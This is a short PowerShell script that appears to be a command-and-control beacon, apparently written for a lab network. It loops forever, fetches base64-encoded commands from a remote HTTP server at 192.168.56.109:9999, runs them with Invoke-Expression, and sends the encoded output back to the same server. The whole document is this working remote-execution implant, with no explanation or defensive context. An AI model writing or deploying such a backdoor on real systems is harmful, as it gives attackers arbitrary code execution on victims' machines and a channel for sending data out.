while($true) {

    $request = Invoke-WebRequest http://192.168.56.109:9999/exec


    if (-not ([string]::IsNullOrEmpty($request.content))) {
        $execb64 = $request.content

        $exec = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($execb64))

        $out = Invoke-Expression $exec | Out-String


        $outb64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($out))

        Invoke-WebRequest http://192.168.56.109:9999/execResponse?res=$outb64
    }

    Start-Sleep -Seconds 5

}
